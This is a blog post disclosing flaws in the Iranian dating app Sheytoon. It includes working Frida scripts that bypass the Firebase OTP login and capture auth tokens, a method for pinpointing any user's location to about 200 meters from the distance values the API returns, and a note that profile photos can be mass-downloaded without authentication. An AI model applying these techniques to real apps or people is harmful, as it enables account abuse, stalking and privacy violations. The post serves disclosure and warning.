---
title: "Be Careful About Your Data on the Internet (Reverse Engineering a Dating App)"
date: 2025-12-17T14:02:01+03:30
---

Recently, I reverse engineered a dating app called Sheytoon and announced this on [cyberplace dot com](https://cyberplace.social/@iliya/115713873085165083) and [X dot com](https://x.com/dozheiny/status/1999886952020193344). This app is mostly focused on dating between Iranian people. As you know, Iran is like an open-source repository, because neither the people nor the government cares about the privacy and security of their own people.

By the way, in this post I want to talk a little more about the technical details of this. So let's begin.

![screenshot of my file explorer that downloads photos from their server](/sheytoon_images.png)
<br/>

# Bypass OTP
After installing Sheytoon on an emulator, I encountered the first problem. The application uses Firebase for sending an OTP, and because I'm using an Android emulator, I got this error:
```html
<a href=//www.google.com/><span id=logo aria-label=Google>
</span></a>  
<p><b>403.</b> <ins>That's an error.</ins>  
<p>Your client does not have permission to get URL 
<code>/identitytoolkit/v3/relyingparty/sendVerificationCode</code>
 from this server.  
<ins>That's all we know.</ins>
```
Or I got errors like *too many OTP requests sent, please try again later*.
After some research and reading the source code, I realized that the OTP check is only on the Firebase side. So I overloaded the authentication and bypassed it with Frida by creating a fake user with null values, and it worked—I got the code!

```js
Java.perform(() => {
    const FirebaseAuth = Java.use("com.google.firebase.auth.FirebaseAuth");
    const AuthResult = Java.use("com.google.firebase.auth.internal.zzx");
    const FirebaseUser = Java.use("com.google.firebase.auth.internal.zzac");
    const TaskImpl = Java.use("com.google.android.gms.tasks.zzw");

    const fakeUser = FirebaseUser.$new(null, null);
    const fakeResult = AuthResult.$new(fakeUser);

    FirebaseAuth.signInWithCredential.overload('com.google.firebase.auth.AuthCredential')
        .implementation = function (cred) {

        console.log("[+] signInWithCredential called → forcing success");

        const t = TaskImpl.$new();
        t.zzb(fakeResult);

        return t;
    };
});
```

![Screenshot of OTP received from Firebase](/sheytoon_otp_after_bypass.png)

# Receive Authorization Token
After creating my user, I found that to call the APIs of the Sheytoon backend service, I needed an Authentication header. I discovered that the application uses the `com.loopj.android.http.AsyncHttpClient` library for calling APIs. So I just overloaded and hooked the `AsyncHttpClient` function call.
```js
Java.perform(function() {
    var AsyncHttpClient = Java.use("com.loopj.android.http.AsyncHttpClient");
    
    var requestHeaders = {};
    
    AsyncHttpClient.addHeader.implementation = function(name, value) {
        console.log("[+] Adding Header: " + name + ": " + value);
        requestHeaders[name] = value;
        return this.addHeader(name, value);
    };
    
    AsyncHttpClient.post.overload(
        'android.content.Context',
        'java.lang.String',
        'cz.msebera.android.httpclient.HttpEntity',
        'java.lang.String',
        'com.loopj.android.http.ResponseHandlerInterface'
    ).implementation = function(ctx, url, entity, contentType, handler) {
        console.log("\n[*] ===== HTTP POST Request =====");
        console.log("[+] URL: " + url);
        console.log("[+] Content-Type: " + contentType);
        
        // Display collected headers
        if (Object.keys(requestHeaders).length > 0) {
            console.log("[+] Request Headers:");
            for (var key in requestHeaders) {
                console.log("    " + key + ": " + requestHeaders[key]);
            }
        }
        
        try {
            var StringEntity = Java.use("cz.msebera.android.httpclient.entity.StringEntity");
            if (entity.$className === "cz.msebera.android.httpclient.entity.StringEntity") {
                var ByteArrayOutputStream = Java.use("java.io.ByteArrayOutputStream");
                var baos = ByteArrayOutputStream.$new();
                entity.writeTo(baos);
                var requestBody = baos.toString("UTF-8");
                console.log("[+] Request Body: " + requestBody);
            }
        } catch (e) {
            console.log("[-] Could not extract request body: " + e);
        }
        
        var result = this.post(ctx, url, entity, contentType, handler);
        requestHeaders = {};
        return result;
    };

    var AsyncHttpResponseHandler = Java.use("com.loopj.android.http.AsyncHttpResponseHandler");
    
    AsyncHttpResponseHandler.onSuccess.overload(
        'int',
        '[Lcz.msebera.android.httpclient.Header;',
        '[B'
    ).implementation = function(statusCode, headers, responseBody) {
        console.log("\n[*] ===== HTTP Response Success =====");
        console.log("[+] Status Code: " + statusCode);
        
        // Dump response headers
        if (headers) {
            console.log("[+] Response Headers:");
            for (var i = 0; i < headers.length; i++) {
                console.log("    " + headers[i].getName() + ": " + headers[i].getValue());
            }
        }
        
        // Dump response body
        if (responseBody) {
            var String = Java.use("java.lang.String");
            var responseStr = String.$new(responseBody);
            console.log("[+] Response Body: " + responseStr);
        }
        
        return this.onSuccess(statusCode, headers, responseBody);
    };

    AsyncHttpResponseHandler.onFailure.overload(
        'int',
        '[Lcz.msebera.android.httpclient.Header;',
        '[B',
        'java.lang.Throwable'
    ).implementation = function(statusCode, headers, responseBody, error) {
        console.log("\n[*] ===== HTTP Response Failure =====");
        console.log("[+] Status Code: " + statusCode);
        console.log("[+] Error: " + error.getMessage());
        
        if (responseBody) {
            var String = Java.use("java.lang.String");
            var responseStr = String.$new(responseBody);
            console.log("[+] Response Body: " + responseStr);
        }
        
        return this.onFailure(statusCode, headers, responseBody, error);
    };
});

```

And after that, I received the Authorization token. At first glance, it looks like a JWT token, and I was right. The content of the token is:
```json
{
  "id": 625464,
  "email": "",
  "isAdmin": false,
  "iat": 1763644945,
  "aud": "sheytoon-users",
  "iss": "sheytoon",
  "sub": "*****"
}
``` 
As you can see, this token does not return an expiration time. It seems the tokens won't expire at all.

# Find Anyone's Location
The application called multiple APIs to the backend service, and all of them are common, like updating a profile or setting a message as seen. However, one of them really caught my attention: the API that returns **nearby users around your location**. The data returns user information like favorite food, education, career, and most interestingly, **distance**. Given that this API returns the distance, it could be concluded that somehow the exact location of the client user is being sent somewhere. When I reopened the app, the first API called was this:
```log
[*] ===== HTTP POST Request =====
[+] URL: https://sheytoon-api-prod.***/users/me
[+] Content-Type: application/json
[+] Request Body: {"latest_latitude":"-37.4219983","latest_longitude":"122.084","location_updated":"1"}
``` 
As you can see, the application sends the client's geographic coordinates to its servers when it first opens. Now I had an idea to find the coordinates of a person's location using the Pythagorean formula.<br/>
With using a Pythagorean formula, you move along the x-axis until the distance reaches its minimum. If you go further, the distance increases. Now we have the initial distance, which was the chord. We put the secondary distance that we obtained into the Pythagorean formula and we get the amount that we need to move up or down on the y-axis. Based on the accuracy of the API call response we received, the location range is obtained with a radius of 200 meters.

# Sensitive Information
The response of the users API contains this:
```json
{
        "profile_images": [
        {
            "image_id": 5418142,
            "image_url": "https://sheytoon-profile-pictures.***/***.jpeg",
            "place": 4,
            "caption": null,
            "mod_action": "accept",
            "legacy_id": null,
            "createdAt": "2025-07-18T13:24:05.000Z",
            "updatedAt": "2025-07-24T20:12:54.000Z",
            "deletedAt": null,
            "user_id": 570075
        }
    ]
}
```
I accidentally clicked on the image URL, and my browser opened the picture with no validation, no authentication, nothing.<br/>
I mean, sure, finding a location requires an authentication token, but for sensitive data like pictures of people, there's no authentication—nothing. With a simple script, anyone can dump and download any photos they want from their server.

# Conclusion
Keep watch over your data. Do not upload anything anywhere; do not share your information anywhere. And if you're Iranian, take this warning seriously, because the government will never take responsibility for data leaks or hacks.

Take care of your data.